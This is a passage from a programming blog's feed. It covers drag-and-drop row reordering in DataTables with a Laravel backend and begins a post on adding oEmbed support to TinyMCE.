class="number">30</span><span class="regexp">/CefSharp-listen-to-JavaScript-event/</span>                   | <span class="number">5</span>         | <span class="number">5</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2012</span><span class="regexp">/12/</span><span class="number">21</span><span class="regexp">/ios-uitabelview-didselectrowatindexpath-is-not-called/</span> | <span class="number">4</span>         | <span class="number">4</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2013</span><span class="regexp">/09/</span><span class="number">12</span><span class="regexp">/get-json-using-php-curl-from-web-service/</span>              | <span class="number">4</span>         | <span class="number">4</span>                |</span><br><span class="line">| <span class="regexp">/blog/</span><span class="number">2014</span><span class="regexp">/08/</span><span class="number">23</span><span class="regexp">/laravel-4-two-pagination-in-a-single-page/</span>             | <span class="number">3</span>         | <span class="number">3</span>                |</span><br><span class="line">| ...                                                                     | ...       | ...              |</span><br><span class="line">+-------------------------------------------------------------------------+-----------+------------------+</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;No doubt that Google is very powerful. I’ve been researching for&lt;br&gt;Google Analytics &lt;em&gt;(GA)&lt;/em&gt; API for quite sometime, due to it’s</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="google-analytics" scheme="http://jslim.net/tags/google-analytics/"/>
    
    <category term="google" scheme="http://jslim.net/tags/google/"/>
    
  </entry>
  
  <entry>
    <title>DataTable re-order rows</title>
    <link href="http://jslim.net/blog/2019/03/01/DataTable-re-order-rows/"/>
    <id>http://jslim.net/blog/2019/03/01/DataTable-re-order-rows/</id>
    <published>2019-03-01T10:30:11.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>In CMS, often the navigation menu is editable in backend, and can change the order.<br>Let’s see how to implement using <a href="https://datatables.net/">DataTable</a>.</p><h3 id="DB-table"><a href="#DB-table" class="headerlink" title="DB table"></a>DB table</h3><p><code>menu</code></p><table><thead><tr><th>id</th><th>seq</th><th>col_1</th><th>col_2</th><th>col_3</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>val 1</td><td>val 1</td><td>val 1</td></tr><tr><td>2</td><td>2</td><td>val 2</td><td>val 2</td><td>val 2</td></tr><tr><td>3</td><td>3</td><td>val 3</td><td>val 3</td><td>val 3</td></tr></tbody></table><h3 id="In-HTML"><a href="#In-HTML" class="headerlink" title="In HTML"></a>In HTML</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@extends(&#x27;layout&#x27;)</span><br><span class="line">@section(&#x27;content&#x27;)</span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">id</span>=<span class="string">&quot;my-table&quot;</span> <span class="attr">class</span>=<span class="string">&quot;table table-pn table-striped&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Seq<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Col 1<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Col 2<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>Col 3<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tbody</span>&gt;</span><span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">@endsection</span><br><span class="line"></span><br><span class="line">@push(&#x27;css&#x27;)</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.datatables.net/1.10.18/css/dataTables.bootstrap4.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;https://cdn.datatables.net/rowreorder/1.2.5/css/rowReorder.dataTables.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">@endpush</span><br><span class="line"></span><br><span class="line">@push(&#x27;js&#x27;)</span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.datatables.net/1.10.19/js/dataTables.bootstrap4.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.datatables.net/rowreorder/1.2.5/js/dataTables.rowReorder.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">@endpush</span><br></pre></td></tr></table></figure><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// declare a global variable</span></span><br><span class="line">    <span class="keyword">var</span> table;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getParams</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&#x27;q&#x27;</span>: $(<span class="string">&#x27;#q&#x27;</span>).<span class="title function_">val</span>(),</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">loadTable</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (table) &#123;</span><br><span class="line">            table.<span class="property">ajax</span>.<span class="title function_">reload</span>(<span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        table = $(<span class="string">&#x27;#my-table&#x27;</span>).<span class="title class_">DataTable</span>(&#123;</span><br><span class="line">            <span class="string">&#x27;serverSide&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;paging&#x27;</span>: <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;rowReorder&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;selector&#x27;</span>: <span class="string">&#x27;tr&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;dataSrc&#x27;</span>: <span class="string">&#x27;seq&#x27;</span>, <span class="comment">// follow the json data</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">&#x27;columnDefs&#x27;</span>: [</span><br><span class="line">                &#123; <span class="string">&#x27;orderable&#x27;</span>: <span class="literal">true</span>, <span class="string">&#x27;targets&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;className&#x27;</span>: <span class="string">&#x27;reorder&#x27;</span> &#125;,</span><br><span class="line">                &#123; <span class="string">&#x27;orderable&#x27;</span>: <span class="literal">false</span>, <span class="string">&#x27;targets&#x27;</span>: <span class="string">&#x27;_all&#x27;</span> &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&#x27;columns&#x27;</span>: [</span><br><span class="line">                &#123; <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;seq&#x27;</span> &#125;,</span><br><span class="line">                &#123; <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;col_1&#x27;</span> &#125;,</span><br><span class="line">                &#123; <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;col_2&#x27;</span> &#125;,</span><br><span class="line">                &#123; <span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;col_3&#x27;</span> &#125;,</span><br><span class="line">            ],</span><br><span class="line">            <span class="string">&#x27;ajax&#x27;</span>: &#123;</span><br><span class="line">                <span class="string">&#x27;url&#x27;</span>: <span class="string">&#x27;/get-menu-data&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">                <span class="string">&#x27;data&#x27;</span>: <span class="keyword">function</span> (<span class="params">d</span>) &#123; <span class="comment">// do in this way, otherwise table.ajax.reload() not working</span></span><br><span class="line">                    <span class="title class_">Object</span>.<span class="title function_">assign</span>(d, <span class="title function_">getParams</span>());</span><br><span class="line">                    <span class="keyword">return</span> d;</span><br><span class="line">                &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// every time drag the row will send a request to server to update the `seq` column</span></span><br><span class="line">        table.<span class="title function_">on</span>( <span class="string">&#x27;row-reorder&#x27;</span>, <span class="keyword">function</span> (<span class="params"> e, diff, edit </span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> postData = [];</span><br><span class="line">            <span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>, ien = diff.<span class="property">length</span> ; i &lt; ien ; i++ ) &#123;</span><br><span class="line">                <span class="keyword">var</span> rowData = table.<span class="title function_">row</span>(diff[i].<span class="property">node</span>).<span class="title function_">data</span>();</span><br><span class="line">                postData.<span class="title function_">push</span>(&#123;</span><br><span class="line">                    <span class="string">&#x27;id&#x27;</span>: rowData.<span class="property">id</span>,</span><br><span class="line">                    <span class="string">&#x27;new_seq&#x27;</span>: diff[i].<span class="property">newData</span>,</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">                <span class="attr">url</span>: <span class="string">&#x27;/update-menu-seq&#x27;</span>,</span><br><span class="line">                <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">                <span class="attr">type</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">                <span class="attr">async</span>: <span class="literal">false</span>, <span class="comment">// disable async, otherwise the table will reload before the db update</span></span><br><span class="line">                <span class="attr">data</span>: &#123;</span><br><span class="line">                    <span class="attr">seqs</span>: postData,</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data, textStatus, jqXHR</span>) &#123;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">error</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus, errorThrown</span>) &#123;</span><br><span class="line">                    <span class="title function_">alert</span>(errorThrown);</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="attr">complete</span>: <span class="keyword">function</span> (<span class="params">jqXHR, textStatus</span>) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">loadTable</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="In-PHP"><a href="#In-PHP" class="headerlink" title="In PHP"></a>In PHP</h2><p>I show the example in Laravel</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getMenuData</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$query</span> = <span class="title class_">Menu</span>::<span class="title function_ invoke__">select</span>([</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;col_1&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;col_2&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;col_3&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;seq&#x27;</span>,</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$total</span> = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$q</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;q&#x27;</span>)) &#123; <span class="comment">// if search</span></span><br><span class="line">            <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">where</span>(function (<span class="variable">$query</span>) <span class="keyword">use</span> ($<span class="title">q</span>) &#123;</span><br><span class="line">                $<span class="title">query</span>-&gt;<span class="title">orWhere</span>(&#x27;<span class="title">col_1</span>&#x27;, &#x27;<span class="title">LIKE</span>&#x27;, &#x27;%&#x27; . $<span class="title">q</span> . &#x27;%&#x27;)</span><br><span class="line">                    -&gt;<span class="title">orWhere</span>(&#x27;<span class="title">col_2</span>&#x27;, &#x27;<span class="title">LIKE</span>&#x27;, &#x27;%&#x27; . $<span class="title">q</span> . &#x27;%&#x27;)</span><br><span class="line">                    -&gt;<span class="title">orWhere</span>(&#x27;<span class="title">col_3</span>&#x27;, &#x27;<span class="title">LIKE</span>&#x27;, &#x27;%&#x27; . $<span class="title">q</span> . &#x27;%&#x27;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$filtered</span> = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">count</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">orderBy</span>(<span class="string">&#x27;seq&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$results</span> = <span class="variable">$query</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;start&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">            -&gt;<span class="title function_ invoke__">take</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;length&#x27;</span>, <span class="number">50</span>))</span><br><span class="line">            -&gt;<span class="title function_ invoke__">get</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;recordsTotal&#x27;</span>    =&gt; <span class="variable">$total</span>,</span><br><span class="line">            <span class="string">&#x27;recordsFiltered&#x27;</span> =&gt; <span class="variable">$filtered</span>,</span><br><span class="line">            <span class="string">&#x27;data&#x27;</span>            =&gt; <span class="variable">$results</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">updateMenuSequence</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$rules</span> = [</span><br><span class="line">            <span class="string">&#x27;seqs&#x27;</span> =&gt; <span class="string">&#x27;required|array&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">        <span class="variable">$validator</span> = <span class="title class_">\Validator</span>::<span class="title function_ invoke__">make</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">all</span>(), <span class="variable">$rules</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">fails</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">                <span class="string">&#x27;error&#x27;</span> =&gt; <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">messages</span>()-&gt;<span class="title function_ invoke__">first</span>(),</span><br><span class="line">            ], <span class="number">400</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sequences</span> = <span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;seqs&#x27;</span>, []);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$sequences</span> <span class="keyword">as</span> <span class="variable">$sequence</span>) &#123;</span><br><span class="line">            <span class="variable">$menu</span> = <span class="title class_">Menu</span>::<span class="title function_ invoke__">where</span>(<span class="string">&#x27;id&#x27;</span>, <span class="variable">$sequence</span>[<span class="string">&#x27;id&#x27;</span>])-&gt;<span class="title function_ invoke__">first</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$menu</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">                    <span class="string">&#x27;error&#x27;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;Menu %d not found.&#x27;</span>, <span class="variable">$sequence</span>[<span class="string">&#x27;id&#x27;</span>]),</span><br><span class="line">                ], <span class="number">400</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$menu</span>-&gt;seq = <span class="variable">$sequence</span>[<span class="string">&#x27;new_seq&#x27;</span>];</span><br><span class="line">            <span class="variable">$menu</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;success&#x27;</span> =&gt; <span class="literal">true</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Menu sequence updated.&#x27;</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now everytime dragged the table row, will trigger the update of the menu sequence, then reload the data table data.</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://datatables.net/extensions/rowreorder/examples/initialisation/events.html">Reorder event</a></li><li><a href="https://stackoverflow.com/questions/42412845/datatables-ajax-reload-with-parameters/42435661#42435661">DataTables ajax.reload() with parameters</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;In CMS, often the navigation menu is editable in backend, and can change the order.&lt;br&gt;Let’s see how to implement using &lt;a</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="datatables" scheme="http://jslim.net/tags/datatables/"/>
    
  </entry>
  
  <entry>
    <title>Laravel - Integrate oEmbed into TinyMCE</title>
    <link href="http://jslim.net/blog/2019/02/20/Laravel-Integrate-oEmbed-into-TinyMCE/"/>
    <id>http://jslim.net/blog/2019/02/20/Laravel-Integrate-oEmbed-into-TinyMCE/</id>
    <published>2019-02-20T15:21:26.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://oembed.com/">oEmbed</a> is a kind of standard to retrieve 3rd party site info.</p><p>Example, in rich editor like <a href="https://www.tiny.cloud/">TinyMCE</a>, if want to embed<br>a YouTube video, what we usually do is</p><ol><li>Get the YouTube video embed code</li><li>Click on the TinyMCE view source button</li><li>Paste the embed code into the content</li></ol><p>I did that previously, and it works. But when I do the same thing to Instagram<br>post, it doesn’t work so well, especially embed more than 1 post.</p><p>If you ever use Wordpress before, you will notice when you paste a YouTube link<br>directly to editor, and it will load the video, without the need of embed code.</p><p>Let’s add the oEmbed feature into your Laravel app</p><h3 id="1-install-a-composer-package"><a href="#1-install-a-composer-package" class="headerlink" title="1. install a composer package"></a>1. install a composer package</h3><p>Because I couldn’t found any good JavaScript oEmbed plugin, then I decided to use<br><a href="https://github.com/oscarotero/Embed">this PHP plugin</a>.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>composer <span class="keyword">require</span> embed/embed</span><br></pre></td></tr></table></figure><h3 id="2-Create-an-API-endpoint"><a href="#2-Create-an-API-endpoint" class="headerlink" title="2. Create an API endpoint"></a>2. Create an API endpoint</h3><p>Add a line to <strong>routes/web.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;oembed&#x27;</span>, [<span class="string">&#x27;as&#x27;</span> =&gt; <span class="string">&#x27;oembed&#x27;</span>, <span class="string">&#x27;uses&#x27;</span> =&gt; <span class="string">&#x27;YourController@oEmbed&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>In <strong>YourController.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">oEmbed</span>(<span class="params">Request <span class="variable">$request</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$rules</span> = [</span><br><span class="line">        <span class="string">&#x27;url&#x27;</span> =&gt; <span class="string">&#x27;required|url&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$validator</span> = <span class="title class_">\Validator</span>::<span class="title function_ invoke__">make</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">all</span>(), <span class="variable">$rules</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">fails</span>()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">            <span class="string">&#x27;error&#x27;</span> =&gt; <span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">messages</span>()-&gt;<span class="title function_ invoke__">first</span>()</span><br><span class="line">        ], <span class="number">400</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title class_">\Embed\Embed</span>::<span class="title function_ invoke__">create</span>(<span class="variable">$request</span>-&gt;<span class="title function_ invoke__">input</span>(<span class="string">&#x27;url&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>()-&gt;<span class="title function_ invoke__">json</span>([</span><br><span class="line">            <span class="string">&#x27;title&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;title, //The page title</span><br><span class="line">            <span class="string">&#x27;description&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;description, //The page description</span><br><span class="line">            <span class="string">&#x27;url&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;url, //The canonical url</span><br><span class="line">            <span class="string">&#x27;type&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;type, //The page <span class="title function_ invoke__">type</span> (link, video, image, rich)</span><br><span class="line">            <span class="string">&#x27;tags&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;tags, //The page <span class="title function_ invoke__">keywords</span> (tags)</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;images&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;images, //List of all images found in the page</span><br><span class="line">            <span class="string">&#x27;image&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;image, //The image choosen <span class="keyword">as</span> main image</span><br><span class="line">            <span class="string">&#x27;image_width&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;imageWidth, //The width of the main image</span><br><span class="line">            <span class="string">&#x27;image_height&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;imageHeight, //The height of the main image</span><br><span class="line"></span><br><span class="line">            <span class="string">&#x27;code&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;code, //The code to embed the image, video, etc</span><br><span class="line">            <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;width, //The width of the embed code</span><br><span class="line">            <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;height, //The height of the embed code</span><br><span class="line">            <span class="string">&#x27;aspect_ratio&#x27;</span> =&gt; <span class="variable">$info</span>-&gt;aspectRatio, //The aspect <span class="title function_ invoke__">ratio</span> (width/height)</span><br><span class="line"></span><br><span class="line">            <span 